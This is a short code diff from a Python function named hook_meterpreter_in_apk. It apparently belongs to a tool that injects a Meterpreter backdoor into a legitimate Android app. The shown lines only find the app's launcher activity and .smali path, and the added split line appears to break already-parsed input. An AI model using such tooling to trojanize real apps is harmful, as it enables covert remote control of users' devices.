@@ -173,10 +173,14 @@ def hook_meterpreter_in_apk(VAR1, VAR2, VAR3):
             launcherActivity = str(launcherActivity.strip()).split('\'')[1]
             break
         lineNumber = lineNumber - 1
+        
+    launcherActivity = str(launcherActivity).split('\'')[1]
+    
     if launcherActivity == "":
         print(f"{RED}[!] Unable to locate the .smali launcher in AndroidManifest.xml")
         print(f"{WHITE}[:] Example input of launcher string : {YELLOW}zl.com.river_iq.RiverIQ")
         launcherActivity = input(f"{BLUE}[?] Please Enter LAUNCHER/MAIN Function Manually from normal_apk/AndroidManifest.xml: ")
+    
     print(f"{GREEN}[+] Finded .smali launcher : {launcherActivity}")
     launcherActivity = launcherActivity.replace('.', '/')  # Ex:- Changing zl.com.river_iq.RiverIQ  TO zl/com/river_iq/RiverIQ
     launcherActivity = "normal_apk/smali/" + launcherActivity + ".smali"         # Ex:- Changing zl/com/river_iq/RiverIQ  TO zl/com/river_iq/RiverIQ.smali
